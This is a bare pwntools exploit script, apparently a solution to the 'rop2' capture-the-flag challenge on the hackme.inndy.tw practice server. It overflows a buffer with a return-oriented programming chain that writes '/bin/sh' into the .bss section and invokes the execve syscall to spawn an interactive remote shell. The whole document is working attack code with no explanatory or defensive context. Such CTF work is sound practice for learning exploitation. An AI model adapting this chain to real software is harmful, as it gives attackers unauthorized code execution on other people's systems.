#!/usr/bin/env python
from pwn import *

a=remote("hackme.inndy.tw",7703)
elf=ELF("./rop2")
bss_addr=elf.bss()
syscall=0x8048320
pop3_ret=0x804843E#pop eax,pop edx,pop ecx,ret
pop_eax_ret=0x0804844e#pop dword ptr [eax],ret

payload='A'*16
payload+=p32(pop3_ret)
payload+=p32(bss_addr)#eax
payload+=p32(0)
payload+=p32(0)
payload+=p32(pop_eax_ret)
payload+="/bin"
payload+=p32(pop3_ret)
payload+=p32(bss_addr+4)
payload+=p32(0)
payload+=p32(0)
payload+=p32(pop_eax_ret)
payload+="/sh\x00"
payload+=p32(syscall)
payload+=p32(pop3_ret)
payload+=p32(0xb)
payload+=p32(bss_addr)
payload+=p32(0)
payload+=p32(0)

a.recvuntil("ropchain:")
a.sendline(payload)
a.interactive()


